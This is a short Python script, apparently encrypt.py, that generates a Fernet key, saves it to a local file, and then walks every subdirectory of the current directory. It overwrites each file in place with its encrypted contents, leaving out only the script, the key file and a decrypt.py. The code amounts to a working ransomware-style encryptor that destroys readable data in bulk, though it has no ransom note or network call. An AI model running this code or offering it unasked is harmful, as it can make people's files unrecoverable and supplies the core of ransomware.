import os
# import required module
from cryptography.fernet import Fernet


# key generation
key = Fernet.generate_key()

# string the key in a file
with open('filekey.key', 'wb') as filekey:
    filekey.write(key)

# opening the key
with open('filekey.key', 'rb') as filekey:
    key = filekey.read()

# using the generated key
fernet = Fernet(key)
path = "."

skipfiles = ['encrypt.py', 'filekey.key', 'decrypt.py']

for root, d_names, f_names in os.walk(path):
   if (len(f_names)):
       for file in f_names:
           if (file in skipfiles):
               continue
           filename = root + '\\' + file
           print(filename)
           with open(filename, 'rb') as file:
               original = file.read()
           encrypted = fernet.encrypt(original)
           with open(filename, 'wb') as encrypted_file:
               encrypted_file.write(encrypted)

